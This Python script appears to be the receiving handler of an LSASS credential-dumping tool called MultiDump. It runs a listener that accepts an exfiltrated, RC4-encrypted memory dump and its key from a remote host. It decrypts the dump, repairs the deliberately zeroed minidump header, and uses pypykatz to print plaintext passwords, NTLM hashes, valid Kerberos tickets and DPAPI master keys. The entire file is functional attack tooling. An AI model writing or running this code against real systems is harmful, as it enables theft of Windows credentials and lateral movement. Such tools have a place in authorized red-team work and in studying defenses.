#!/usr/bin/env python3

import argparse
import binascii
import io
import socket
import struct
from datetime import datetime

from pypykatz.pypykatz import pypykatz


class TerminalColor:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


class Credential:
    def __init__(
        self,
        username,
        password=None,
        domain=None,
        lmhash=None,
        nthash=None,
        sha1=None,
        ticket=None,
        ssp=None,
        masterkey=None,
    ):
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = lmhash
        self.nthash = nthash
        self.sha1 = sha1
        self.ticket = ticket
        self.ssp = ssp
        self.masterkey = masterkey

    def __str__(self):
        attributes = [
            f"SSP: {self.ssp}",
            f"Domain: {self.domain}" if self.domain else "",
            f"Username: {self.username}" if self.username else "",
            f"Password: {self.password}" if self.password else "",
            f"LMHash: {self.lmhash}" if self.lmhash else "",
            f"NTHash: {self.nthash}" if self.nthash else "",
            f"SHA1: {self.sha1}" if self.sha1 else "",
            f"MasterKey: {self.masterkey}" if self.masterkey else "",
        ]
        return "\n".join(filter(None, attributes)) + "\n"


# From lsassy: https://github.com/Hackndo/lsassy
# https://github.com/Hackndo/lsassy/blob/f24b350c2d6277cbe64159cf3c7ee41fe9ef0de8/lsassy/parser.py#L16
def parse_dump(dump):
    credentials = []
    tickets = []
    masterkeys = []
    try:
        pypy_parse = pypykatz.parse_minidump_bytes(dump)
    except Exception as e:
        raise e

    ssps = [
        "msv_creds",
        "wdigest_creds",
        "ssp_creds",
        "livessp_creds",
        "kerberos_creds",
        "credman_creds",
        "tspkg_creds",
        "dpapi_creds",
    ]
    for luid in pypy_parse.logon_sessions:
        for ssp in ssps:
            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
                domain = getattr(cred, "domainname", None)
                username = getattr(cred, "username", None)
                password = getattr(cred, "password", None)
                LMHash = getattr(cred, "LMHash", None)
                NThash = getattr(cred, "NThash", None)
                SHA1 = getattr(cred, "SHAHash", None)
                if LMHash is not None:
                    LMHash = LMHash.hex()
                if NThash is not None:
                    NThash = NThash.hex()
                if SHA1 is not None:
                    SHA1 = SHA1.hex()
                if username and (
                    password
                    or (NThash and NThash != "00000000000000000000000000000000")
                    or (LMHash and LMHash != "00000000000000000000000000000000")
                ):
                    credentials.append(
                        Credential(
                            ssp=ssp,
                            domain=domain,
                            username=username,
                            password=password,
                            lmhash=LMHash,
                            nthash=NThash,
                            sha1=SHA1,
                        )
                    )

        for kcred in pypy_parse.logon_sessions[luid].kerberos_creds:
            for ticket in kcred.tickets:
                tickets.append(ticket)

        for dpapicred in pypy_parse.logon_sessions[luid].dpapi_creds:
            m = "{%s}:%s" % (dpapicred.key_guid, dpapicred.sha1_masterkey)
            if m not in masterkeys:
                masterkeys.append(m)
                credentials.append(
                    Credential(ssp="dpapi", domain="", username="", masterkey=m)
                )

    for cred in pypy_parse.orphaned_creds:
        if cred.credtype == "kerberos":
            for ticket in cred.tickets:
                tickets.append(ticket)

    for ticket in tickets:
        if ticket.ServiceName is not None and ticket.ServiceName[0] == "krbtgt":
            if ticket.EClientName is not None and ticket.DomainName is not None:
                if (
                    ticket.TargetDomainName is not None
                    and ticket.TargetDomainName != ticket.DomainName
                ):
                    target_domain = ticket.TargetDomainName
                else:
                    target_domain = ticket.DomainName
                # Keep only valid tickets
                if ticket.EndTime > datetime.now(ticket.EndTime.tzinfo):
                    credentials.append(
                        Credential(
                            ssp="kerberos",
                            domain=ticket.DomainName,
                            username=ticket.EClientName[0],
                            ticket={
                                "file": list(ticket.kirbi_data)[0].split(".kirbi")[0]
                                + "_"
                                + ticket.EndTime.strftime("%Y%m%d%H%M%S")
                                + ".kirbi",
                                "domain": target_domain,
                                "endtime": ticket.EndTime,
                            },
                        )
                    )

    return credentials, tickets, masterkeys


def parse_arguments():
    parser = argparse.ArgumentParser(description="Handler for RemoteProcDump")

    group = parser.add_mutually_exclusive_group(required=True)

    group.add_argument(
        "-r", "--remote", type=int, help="Port to receive remote dump file"
    )
    parser.add_argument(
        "--override-ip",
        help="Manually specify the IP address for key generation in remote mode, for proxied connection",
        type=str,
    )

    group.add_argument("-l", "--local", help="Local dump file, key needed to decrypt")
    parser.add_argument("-k", "--key", help="Key to decrypt local file")

    args = parser.parse_args()

    if args.local and not args.key:
        parser.error("-k/--key is required when -l/--local-file is used")

    return args


def read_file(filepath):
    with open(filepath, "rb") as file:
        return file.read()


def rc4_decrypt(key, data):
    # KSA
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    # PRGA
    i = j = 0
    result = bytearray()
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(char ^ S[(S[i] + S[j]) % 256])

    return bytes(result)


def mod_magic_bytes(data):
    if data[:6] == b"\x00\x00\x00\x00\x00\x00":
        replacement_bytes = bytes.fromhex("4D 44 4D 50 93 A7")
        modified_data = replacement_bytes + data[6:]
        return modified_data
    else:
        raise Exception()


def print_creds(credentials, tickets, masterkeys):
    print("\nCredentials:")
    for cred in credentials:
        print(cred)

    print("\nTickets:")
    for ticket in tickets:
        print(ticket)

    print("\nMasterkeys:")
    for key in masterkeys:
        print(key)


def write_file(filepath, data):
    with open(filepath, "wb") as file:
        file.write(data)
    print(f"{TerminalColor.OKGREEN}[i] Saved as {filepath}{TerminalColor.ENDC}")


def process_dump(raw_data, key):
    if isinstance(key, str):
        try:
            key = bytes.fromhex(key)
        except ValueError as e:
            return (
                None,
                f"{TerminalColor.FAIL}[!] Error converting key: {e}{TerminalColor.ENDC}",
            )

    try:
        print(f"{TerminalColor.OKBLUE}[i] Decrypting dump data...{TerminalColor.ENDC}")
        decrypted_data = rc4_decrypt(key, raw_data)
    except Exception as e:
        return (
            raw_data,
            f"{TerminalColor.FAIL}[!] Error during decryption: {e}{TerminalColor.ENDC}",
        )

    try:
        print(f"{TerminalColor.OKBLUE}[i] Fixing magic bytes...{TerminalColor.ENDC}")
        lsass_dump = mod_magic_bytes(decrypted_data)
    except Exception as e:
        return (
            decrypted_data,
            f"{TerminalColor.FAIL}[!] The magic bytes are not zero! Probably wrong file/key used, or data lost during transfer.{TerminalColor.ENDC}",
        )

    try:
        print(f"{TerminalColor.OKBLUE}[i] Parsing dump file...{TerminalColor.ENDC}")
        credentials, tickets, masterkeys = parse_dump(lsass_dump)
    except Exception as e:
        return (
            lsass_dump,
            f"{TerminalColor.FAIL}[!] Error parsing lsass dump with pypykatz: {str(e)}{TerminalColor.ENDC}",
        )

    print_creds(credentials, tickets, masterkeys)
    return lsass_dump, f"{TerminalColor.OKGREEN}\n[+] All done!{TerminalColor.ENDC}"


def generate_key(ip, port):
    ip_numeric = struct.unpack("!L", socket.inet_aton(ip))[0]
    key = (ip_numeric << 16) | int(port)
    print(
        f"{TerminalColor.OKBLUE}[i] Using {key} to decrypt key...{TerminalColor.ENDC}"
    )
    key_bytes = key.to_bytes(8, "little")
    return key_bytes


def start_server(port, type, threshold_kb):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", port))
    server_socket.listen(1)
    print(f"[i] Listening on port {port} for {type}...")

    client_socket, (client_ip, client_port) = server_socket.accept()
    local_ip = client_socket.getsockname()[0]
    print(
        f"{TerminalColor.OKGREEN}[+] Connection established from {client_ip}:{client_port}{TerminalColor.ENDC}\n"
    )

    total_bytes_received = 0
    received_data = b""
    next_status_threshold = 10 * 1024 * 1024  # 10 MB
    threshold_bytes = threshold_kb * 1024  # Convert KB threshold to bytes

    while True:
        chunk = client_socket.recv(1048576)  # 1 MB
        if not chunk:
            break
        received_data += chunk
        total_bytes_received += len(chunk)

        # Check if received bytes exceed the threshold
        if total_bytes_received > threshold_bytes:
            print(
                f"{TerminalColor.FAIL}[!] Data limit exceeded. Terminating connection.{TerminalColor.ENDC}"
            )
            exit(1)

        if total_bytes_received >= next_status_threshold:
            print(
                f"{TerminalColor.WARNING}[i] Received {total_bytes_received / (1024 * 1024):.2f} MB...{TerminalColor.ENDC}"
            )
            next_status_threshold += 10 * 1024 * 1024

    client_socket.close()
    server_socket.close()

    return received_data, local_ip, total_bytes_received


def handle_remote_dump(args):
    dump_data = None

    try:
        enc_dump_key, local_ip, key_bytes_received = start_server(
            args.remote, "encrypted key", 1
        )

        if len(enc_dump_key) != 64:
            print(f"{TerminalColor.FAIL}[!] Key size mismatch!{TerminalColor.ENDC}")
            return  # Return early since the key size is incorrect

        dump_data, local_ip, dump_bytes_received = start_server(
            args.remote, "encrypted dump", 512000
        )
        print(
            f"{TerminalColor.OKGREEN}[+] Received {dump_bytes_received / (1024 * 1024):.2f} MB{TerminalColor.ENDC}\n"
        )

        # Handle IP override or confirmation
        if args.override_ip:
            dump_key_key = generate_key(args.override_ip, args.remote)
        else:
            response = input(
                f"Detected IP: {local_ip}, does this match the IP used by MultiDump? [Y/n] "
            ).lower()
            if response == "n":
                local_ip = input("Enter an IP: ")
            dump_key_key = generate_key(local_ip, args.remote)

        # Attempt decryption
        dump_key = rc4_decrypt(dump_key_key, enc_dump_key)
        print(
            f"{TerminalColor.OKBLUE}[i] Decrypted key: {binascii.hexlify(dump_key).decode()}{TerminalColor.ENDC}\n"
        )

        # Process the dump
        dump_data, message = process_dump(dump_data, dump_key)
        print(message)

    except Exception as e:
        print(f"{TerminalColor.FAIL}[!] Error: {e}{TerminalColor.ENDC}")
    finally:
        # Ensure write_file is called even if there's an error
        if dump_data:
            response = input("Save the processed dump file? [Y/n] ").lower()
            if response != "n":
                write_file("lsass.dmp", dump_data)


def main():
    args = parse_arguments()

    if args.local and args.key:
        enc_dump = read_file(args.local)

        dump_data, message = process_dump(enc_dump, args.key)
        print(message)

        if dump_data:
            response = input("Save the processed dump file? [Y/n] ").lower()
            if response != "n":
                write_file("lsass.dmp", dump_data)

    elif args.remote:
        handle_remote_dump(args)


if __name__ == "__main__":
    main()
